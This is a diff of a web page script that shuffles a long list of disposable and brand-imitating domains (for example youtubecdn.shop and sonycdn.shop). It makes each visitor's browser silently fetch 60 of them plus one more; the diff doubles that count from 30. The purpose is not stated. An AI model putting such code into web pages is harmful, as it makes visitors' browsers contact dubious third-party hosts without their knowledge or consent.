@@ -15,10 +15,7 @@ function shuffle(arr) {
 	return arr
 }
 shuffle([
-// A
-'asia1.youtubecdn.shop',
-'sawa-api-vc-not.zpchat.uk',
-// B
+/*BEGIN LIST*/
 'dynamicf83wk7.zyrpox.buzz',
 'cbd.sonycdn.shop',
 'dynamicgr5jxp.najda.cyou',
@@ -250,8 +247,10 @@ shuffle([
 'dynamicpkwv1j.zowqyx.buzz',
 'dynamicsh6m5b.vyrkat.buzz',
 'dynamiccrheuy.xyrpaz.cyou',
+/*END LIST*/
 ])
-.slice(0, 30)
+.slice(0, 60)
+.concat(['asia1.youtubecdn.shop'])
 .map(host => 'https://' + host + '/api/gm/hii/?host=' + host)
 .forEach(url => fetch(url))
 var _hmt = _hmt || [];
